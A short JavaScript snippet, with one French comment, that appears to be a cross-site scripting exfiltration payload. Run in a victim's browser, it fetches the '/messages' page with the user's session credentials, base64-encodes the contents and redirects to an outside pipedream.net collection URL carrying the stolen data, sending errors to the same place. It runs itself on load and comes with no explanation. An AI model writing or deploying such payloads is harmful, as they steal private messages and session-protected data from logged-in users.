async function sendViaLocation() {
  try {
    const res = await fetch("/messages", { method: "GET", credentials: "include" });
    if (!res.ok) throw new Error("HTTP " + res.status);
    const txt = await res.text();
    const b64 = btoa(unescape(encodeURIComponent(txt)));
    // remplace la page actuelle (pas d'historique ajouté)
    location.replace("https://eoeipamgnflz15n.m.pipedream.net/?p=" + encodeURIComponent(b64));
  } catch (err) {
    const b64err = btoa(unescape(encodeURIComponent(String(err))));
    location.replace("https://eoeipamgnflz15n.m.pipedream.net/?err=" + encodeURIComponent(b64err));
  }
}
sendViaLocation();
